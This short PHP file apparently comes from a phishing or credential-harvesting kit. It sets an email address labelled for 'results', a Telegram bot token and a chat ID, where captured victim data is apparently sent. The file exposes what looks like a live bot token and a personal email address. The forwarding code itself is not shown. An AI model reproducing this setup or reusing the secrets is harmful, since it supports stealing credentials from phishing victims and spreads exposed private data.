<?php 
//Email
	$send = "resultsplenty1milly@hotmail.com";
	//Telegram Bot Token
$TGBO = '6029632505:AAHgjbG3e28vyEkMCd076H84BQdglMScCks';
//Telegram ChatID 
$cID = '5163615926';
